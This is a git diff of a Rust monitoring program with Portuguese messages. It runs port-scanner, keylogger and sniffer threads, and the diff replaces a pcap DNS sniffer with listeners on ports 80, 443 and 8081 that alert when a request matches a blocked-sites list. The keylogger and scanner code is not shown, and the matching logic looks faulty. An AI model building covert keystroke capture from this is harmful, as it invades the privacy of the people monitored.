@@ -1,12 +1,13 @@
 extern crate winapi;
 extern crate mac_address;
+use std::sync::Arc;
+use std::sync::Mutex;
 use std::thread;
 use std::time::Duration;
 use reqwest;
 use std::fs::File;
 use serde_json::{json};
 use std::collections::HashMap;
-use std::io::prelude::*;
 use reqwest::header::HeaderMap;
 use std::ptr;
 use std::mem;
@@ -20,12 +21,11 @@ use mac_address::get_mac_address;
 use tokio::net::TcpStream;
 use tokio::io::{AsyncReadExt};
 use tokio::runtime::Runtime;
-//extern crate pcap;
-//extern crate dns_parser;
-//use std::collections::HashSet;
-//use std::io::{self, BufRead};
-//use pcap::{Device, Packet};
-//use pcap::Capture;
+use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
+use std::io::{Read, Write};
+use std::collections::HashSet;
+use std::io::{self, BufRead};
+
 
 
 async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
@@ -46,15 +46,15 @@ async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
         rt.block_on(keylogger());
     });
 
-    //let sniffer_handle = thread::spawn(|| {
-    //    println!("Iniciou a thread do sniffer");
-    //    let rt = Runtime::new().unwrap();
-    //    rt.block_on(sniffer());
-    //});
+    let sniffer_handle = thread::spawn(|| {
+        println!("Iniciou a thread do sniffer");
+        let rt = Runtime::new().unwrap();
+        rt.block_on(sniffer());
+    });
 
     scanner_handle.join().unwrap();
     keylogger_handle.join().unwrap();
-    //sniffer_handle.join().unwrap();
+    sniffer_handle.join().unwrap();
 
     loop {
         thread::sleep(Duration::from_secs(1));
@@ -70,46 +70,65 @@ fn main() {
         .block_on(main_async());
 }
 
-//fn read_blocked_sites(filename: &str) -> io::Result<HashSet<String>> {
-//    let file = File::open(filename)?;
-//    let reader = io::BufReader::new(file);
-//    let blocked_sites: HashSet<String> = reader.lines().map(|line| line.unwrap()).collect();
-//    Ok(blocked_sites)
-//}
+async fn sniffer(){
+    let addresses = [
+        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 8081),
+        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 80),
+        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 443),
+    ];
 
-//async fn sniffer() -> io::Result<()> {
-//    let blocked_sites = read_blocked_sites("C:\\keyLogger\\sites.txt")?;
-//    let logs: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(vec![]));
-//
-//    let sniffer_logs = logs.clone();
-//
-//    let device = Device::lookup().unwrap();
-//    let mut cap = Capture::from_device(device).unwrap()
-//        .promisc(true)
-//        .snaplen(65535)
-//        .open()
-//        .unwrap();
-//
-//    while let Ok(packet) = cap.next() {
-//        sniffer_handler(packet.data, &blocked_sites, &sniffer_logs);
-//    }
-//
-//    Ok(())
-//}
-//
-//fn sniffer_handler(pkt: &[u8], blocked_sites: &HashSet<String>, logs: &Arc<Mutex<Vec<String>>>) {
-//    if let Ok(dns_packet) = dns_parser::Packet::parse(pkt) {
-//        if let Some(query) = dns_packet.questions.get(0) {
-//            let query_str = query.qname.to_string();
-//            if blocked_sites.contains(&query_str) {
-//                let log = format!("Alerta gerado pelo seguinte DNS: {}", query_str);
-//                send_alert(log.as_str());
-//            }
-//        }
-//    }
-//}
+    for address in &addresses {
+        start_server(*address);
+    }
+}
 
-// Max IP Port.
+fn start_server(address: SocketAddrV4) {
+    let listener = TcpListener::bind(address).expect("Falha ao criar o servidor");
+
+    println!("Aguardando conexões na porta {}...", address.port());
+
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                thread::spawn(|| {
+                    let _ = handle_client(stream);
+                });
+            }
+            Err(e) => {
+                eprintln!("Erro ao aceitar conexão: {}", e);
+            }
+        }
+    }
+}
+
+fn read_blocked_sites(filename: &str) -> io::Result<HashSet<String>> {
+    let file = File::open(filename)?;
+    let reader = io::BufReader::new(file);
+    let blocked_sites: HashSet<String> = reader.lines().map(|line| line.unwrap()).collect();
+    Ok(blocked_sites)
+}
+
+fn handle_client(mut stream: std::net::TcpStream) -> io::Result<()> {
+    let blocked_sites = read_blocked_sites("C:\\keyLogger\\sites.txt")?;
+    let mut logs: String = "".to_string();
+    let mut buffer = [0; 1024];
+    
+    if let Ok(size) = stream.read(&mut buffer) {
+        if let Ok(request) = String::from_utf8(buffer[..size].to_vec()) {
+            if blocked_sites.contains(&request) {
+                logs = format!("Alerta gerado pelo seguinte DNS: {}", request);
+                send_alert(&logs);
+            }
+        }
+    }
+
+    let response = "HTTP/1.1 200 OK\r\n\r\nHello, World!";
+    if let Err(e) = stream.write(response.as_bytes()) {
+        eprintln!("Erro ao escrever resposta: {}", e);
+    }
+    Ok(())
+}
+
 const MAX: u16 = 9000;
 
 async fn scan(target: &str, port: u16) -> Option<u16> {
